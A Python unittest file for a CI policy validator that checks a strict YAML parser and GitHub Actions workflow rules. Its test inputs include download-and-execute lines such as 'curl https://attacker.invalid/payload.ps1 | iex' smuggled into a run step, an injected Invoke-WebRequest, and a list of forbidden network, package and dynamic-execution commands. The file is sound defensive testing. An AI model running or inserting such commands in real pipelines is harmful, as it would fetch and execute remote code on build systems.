from __future__ import annotations

import copy
import json
import pathlib
import sys
import unittest


POLICY_DIR = pathlib.Path(__file__).resolve().parents[1]
sys.path.insert(0, str(POLICY_DIR))

from policy_lib import (  # noqa: E402
    APPROVED_ACTIONS,
    PolicyError,
    StrictYamlParser,
    parse_workflow_yaml,
    scan_run_script,
    validate_approval_graph,
    validate_workflow_document,
)


class PolicyTestCase(unittest.TestCase):
    def assert_policy_error(self, code, function):
        with self.assertRaises(PolicyError) as raised:
            function()
        self.assertEqual(raised.exception.code, code)


class StrictYamlTests(PolicyTestCase):
    def test_literal_run_block_is_semantic_data(self):
        parsed = StrictYamlParser(
            "root:\n"
            "  steps:\n"
            "    - name: safe\n"
            "      run: |\n"
            "        echo first\n"
            "          echo intentionally-indented\n"
        ).parse()
        self.assertEqual(
            parsed["root"]["steps"][0]["run"],
            "echo first\n  echo intentionally-indented\n",
        )

    def test_exact_plain_run_continuation_exploit_is_rejected(self):
        exploit = (
            "jobs:\n"
            "  verify:\n"
            "    steps:\n"
            "      - run: echo admitted\n"
            "          curl https://attacker.invalid/payload.ps1 | iex\n"
        )
        self.assert_policy_error(
            "YAML_PLAIN_CONTINUATION", lambda: StrictYamlParser(exploit).parse()
        )

    def test_more_indented_shell_continuation_exploit_is_rejected(self):
        exploit = (
            "jobs:\n"
            "  verify:\n"
            "    steps:\n"
            "      - run: Write-Output safe\n"
            "            ; Invoke-WebRequest https://attacker.invalid/x\n"
        )
        self.assert_policy_error(
            "YAML_PLAIN_CONTINUATION", lambda: StrictYamlParser(exploit).parse()
        )

    def test_plain_scalar_cannot_gain_a_second_line(self):
        exploit = "run: echo safe\n  whoami\n"
        self.assert_policy_error(
            "YAML_PLAIN_CONTINUATION", lambda: StrictYamlParser(exploit).parse()
        )

    def test_unsupported_yaml_features_fail_closed(self):
        cases = {
            "flow": "items: [one, two]\n",
            "folded": "run: >\n  echo unsafe\n",
            "chomped": "run: |-\n  echo unsafe\n",
            "anchor": "value: &shared unsafe\n",
            "alias": "value: *shared\n",
            "tag": "value: !unsafe payload\n",
            "quoted": 'value: "quoted"\n',
            "directive": "%YAML 1.2\nvalue: x\n",
            "document": "---\nvalue: x\n",
            "comment": "value: x # hidden\n",
            "full-comment": "# hidden\nvalue: x\n",
            "tab": "value:\n\tchild: x\n",
        }
        for label, source in cases.items():
            with self.subTest(label=label):
                with self.assertRaises(PolicyError):
                    StrictYamlParser(source).parse()

    def test_duplicate_keys_fail_closed(self):
        self.assert_policy_error(
            "YAML_DUPLICATE_KEY",
            lambda: StrictYamlParser("value: one\nvalue: two\n").parse(),
        )

    def test_ambiguous_yaml_booleans_fail_closed(self):
        for value in ("yes", "no", "on", "off"):
            with self.subTest(value=value):
                self.assert_policy_error(
                    "YAML_AMBIGUOUS_BOOLEAN",
                    lambda value=value: StrictYamlParser(f"value: {value}\n").parse(),
                )

    def test_indentation_must_be_exactly_two_spaces(self):
        self.assert_policy_error(
            "YAML_INDENT",
            lambda: StrictYamlParser("root:\n   child: value\n").parse(),
        )


class WorkflowSemanticTests(PolicyTestCase):
    @classmethod
    def setUpClass(cls):
        cls.graph = json.loads(
            (POLICY_DIR / "approval-graph.json").read_text(encoding="utf-8")
        )
        cls.workflow_path = pathlib.Path(
            next(iter(cls.graph["workflows"]))
        )
        cls.workflow = parse_workflow_yaml(
            (POLICY_DIR.parents[1] / cls.workflow_path).read_text(encoding="utf-8")
        )
        cls.spec = next(iter(cls.graph["workflows"].values()))

    def validate(self, document=None, spec=None, actions=None):
        return validate_workflow_document(
            document or self.workflow,
            spec or self.spec,
            actions or APPROVED_ACTIONS,
        )

    def mutate(self):
        return copy.deepcopy(self.workflow)

    def test_checked_in_workflow_has_only_expected_helpers(self):
        self.assertEqual(
            self.validate(),
            {
                ".github/policy/private-root.ps1",
                ".github/policy/validator.py",
            },
        )

    def test_graph_has_all_exact_approved_action_pins(self):
        validate_approval_graph(self.graph)
        self.assertEqual(self.graph["approved_actions"], APPROVED_ACTIONS)
        for pin in APPROVED_ACTIONS.values():
            self.assertRegex(pin, r"^[0-9a-f]{40}$")

    def test_dedicated_anchor_cannot_reuse_generic_actions_identity(self):
        graph = copy.deepcopy(self.graph)
        graph["repository"]["dedicated_check"]["integration_id"] = 15368
        self.assert_policy_error(
            "GRAPH_CHECK", lambda: validate_approval_graph(graph)
        )

    def test_added_dispatch_call_schedule_pages_deployment_release_events_deny(self):
        for event in (
            "workflow_dispatch",
            "workflow_call",
            "schedule",
            "pages_build",
            "deployment",
            "deployment_status",
            "release",
        ):
            document = self.mutate()
            document["on"][event] = {"types": ["created"]}
            with self.subTest(event=event):
                self.assert_policy_error(
                    "WORKFLOW_EVENT_FORBIDDEN", lambda document=document: self.validate(document)
                )

    def test_pull_request_event_cannot_replace_protected_target_event(self):
        document = self.mutate()
        document["on"]["pull_request"] = document["on"].pop("pull_request_target")
        self.assert_policy_error(
            "WORKFLOW_EVENT_UNMODELED", lambda: self.validate(document)
        )

    def test_allowlisted_event_still_must_match_graph_exactly(self):
        spec = copy.deepcopy(self.spec)
        spec["events"] = []
        spec["event_types"] = {}
        self.assert_policy_error(
            "WORKFLOW_EVENTS", lambda: self.validate(spec=spec)
        )

    def test_arbitrary_event_outside_global_allow_list_denies(self):
        document = self.mutate()
        document["on"] = {"issues": {"types": ["opened"]}}
        spec = copy.deepcopy(self.spec)
        spec["events"] = ["issues"]
        spec["event_types"] = {"issues": ["opened"]}
        self.assert_policy_error(
            "WORKFLOW_EVENT_UNMODELED", lambda: self.validate(document, spec)
        )

    def test_write_or_extra_permissions_deny(self):
        for permission, value in (
            ("contents", "write"),
            ("actions", "read"),
            ("pull-requests", "write"),
            ("pages", "write"),
            ("deployments", "write"),
        ):
            document = self.mutate()
            document["permissions"][permission] = value
            with self.subTest(permission=permission):
                self.assert_policy_error(
                    "WORKFLOW_PERMISSIONS", lambda document=document: self.validate(document)
                )

    def test_secret_reference_denies(self):
        document = self.mutate()
        document["jobs"]["verify"]["steps"][2]["env"]["UNSAFE"] = (
            "${{ secrets.DEPLOY_TOKEN }}"
        )
        spec = copy.deepcopy(self.spec)
        spec["jobs"]["verify"]["steps"][2]["env"]["UNSAFE"] = (
            "${{ secrets.DEPLOY_TOKEN }}"
        )
        self.assert_policy_error(
            "WORKFLOW_SECRET", lambda: self.validate(document, spec)
        )

    def test_unmodeled_github_token_denies(self):
        document = self.mutate()
        document["jobs"]["verify"]["steps"][1]["env"]["UNSAFE"] = (
            "${{ github.token }}"
        )
        spec = copy.deepcopy(self.spec)
        spec["jobs"]["verify"]["steps"][1]["env"]["UNSAFE"] = (
            "${{ github.token }}"
        )
        self.assert_policy_error(
            "WORKFLOW_TOKEN", lambda: self.validate(document, spec)
        )

    def test_step_if_continue_timeout_all_deny(self):
        for key, value in (
            ("if", "${{ always() }}"),
            ("continue-on-error", True),
            ("timeout-minutes", 1),
        ):
            document = self.mutate()
            document["jobs"]["verify"]["steps"][1][key] = value
            with self.subTest(key=key):
                self.assert_policy_error(
                    "WORKFLOW_STEP_FORBIDDEN",
                    lambda document=document: self.validate(document),
                )

    def test_job_if_continue_timeout_container_services_all_deny(self):
        cases = {
            "if": "${{ always() }}",
            "continue-on-error": True,
            "timeout-minutes": 1,
            "container": "ubuntu:latest",
            "services": {"db": {"image": "postgres:latest"}},
        }
        for key, value in cases.items():
            document = self.mutate()
            document["jobs"]["verify"][key] = value
            with self.subTest(key=key):
                self.assert_policy_error(
                    "WORKFLOW_JOB_FORBIDDEN",
                    lambda document=document: self.validate(document),
                )

    def test_checkout_is_exact_first_unconditional_base_checkout(self):
        checkout = self.workflow["jobs"]["verify"]["steps"][0]
        self.assertEqual(
            checkout["uses"],
            "actions/checkout@11d5960a326750d5838078e36cf38b85af677262",
        )
        self.assertEqual(
            checkout["with"]["ref"],
            "${{ github.event.pull_request.base.sha }}",
        )
        self.assertIs(checkout["with"]["persist-credentials"], False)
        self.assertNotIn("if", checkout)

    def test_candidate_checkout_ref_denies(self):
        document = self.mutate()
        document["jobs"]["verify"]["steps"][0]["with"]["ref"] = (
            "${{ github.event.pull_request.head.sha }}"
        )
        spec = copy.deepcopy(self.spec)
        spec["jobs"]["verify"]["steps"][0]["with"]["ref"] = document["jobs"][
            "verify"
        ]["steps"][0]["with"]["ref"]
        self.assert_policy_error(
            "CHECKOUT_REF", lambda: self.validate(document, spec)
        )

    def test_unpinned_or_uppercase_action_sha_denies(self):
        for pin in ("v4", APPROVED_ACTIONS["actions/checkout"].upper()):
            document = self.mutate()
            document["jobs"]["verify"]["steps"][0]["uses"] = (
                f"actions/checkout@{pin}"
            )
            with self.subTest(pin=pin):
                self.assert_policy_error(
                    "ACTION_PIN", lambda document=document: self.validate(document)
                )

    def _replace_last_step_with_action(self, uses, inputs):
        document = self.mutate()
        spec = copy.deepcopy(self.spec)
        document["jobs"]["verify"]["steps"][2] = {
            "name": "Delegated action",
            "uses": uses,
            "with": inputs,
        }
        spec["jobs"]["verify"]["steps"][2] = {
            "name": "Delegated action",
            "kind": "action",
            "action": uses.split("@", 1)[0],
            "with": inputs,
        }
        spec["helpers"] = [".github/policy/private-root.ps1"]
        spec["data"] = []
        return document, spec

    def test_local_docker_and_reusable_actions_deny(self):
        cases = (
            ("./.github/actions/local", {}),
            ("docker://alpine:latest", {}),
            (
                "owner/repo/.github/workflows/reusable.yml@"
                "1111111111111111111111111111111111111111",
                {},
            ),
        )
        for uses, inputs in cases:
            document, spec = self._replace_last_step_with_action(uses, inputs)
            with self.subTest(uses=uses):
                with self.assertRaises(PolicyError):
                    self.validate(document, spec)

    def test_mingwarm64_is_rejected_at_mandated_setup_pin(self):
        uses = (
            "msys2/setup-msys2@"
            "66cd2cce69caa17b53920067426061ca1de3a884"
        )
        document, spec = self._replace_last_step_with_action(
            uses, {"msystem": "MINGWARM64"}
        )
        self.assert_policy_error(
            "MSYSTEM_UNSUPPORTED", lambda: self.validate(document, spec)
        )

    def test_action_must_match_graph_identity_not_only_inputs(self):
        document = self.mutate()
        spec = copy.deepcopy(self.spec)
        spec["jobs"]["verify"]["steps"][0]["action"] = "actions/upload-artifact"
        self.assert_policy_error(
            "ACTION_GRAPH", lambda: self.validate(document, spec)
        )

    def test_supported_msystem_boundary_is_modeled(self):
        uses = (
            "msys2/setup-msys2@"
            "66cd2cce69caa17b53920067426061ca1de3a884"
        )
        document, spec = self._replace_last_step_with_action(
            uses, {"msystem": "CLANGARM64"}
        )
        self.validate(document, spec)

    def test_network_package_git_and_container_commands_deny(self):
        scripts = {
            "network": "curl https://attacker.invalid/x\n",
            "package": "pip install attacker\n",
            "git-fetch": "git fetch origin attacker\n",
            "git-checkout": "git checkout attacker\n",
            "container": "docker run attacker/image\n",
            "dynamic": "Invoke-Expression $candidate\n",
        }
        expected = {
            "network": "NETWORK_EXECUTION",
            "package": "PACKAGE_EXECUTION",
            "git-fetch": "GIT_ACQUISITION",
            "git-checkout": "GIT_ACQUISITION",
            "container": "CONTAINER_EXECUTION",
            "dynamic": "DYNAMIC_EXECUTION",
        }
        for label, script in scripts.items():
            with self.subTest(label=label):
                self.assert_policy_error(
                    expected[label], lambda script=script: scan_run_script(script)
                )

    def test_only_safe_fork_execution_model_is_accepted(self):
        spec = copy.deepcopy(self.spec)
        spec["fork_execution"] = "candidate-shell-with-read-token"
        self.assert_policy_error(
            "WORKFLOW_FORK_MODEL", lambda: self.validate(spec=spec)
        )


if __name__ == "__main__":
    unittest.main()
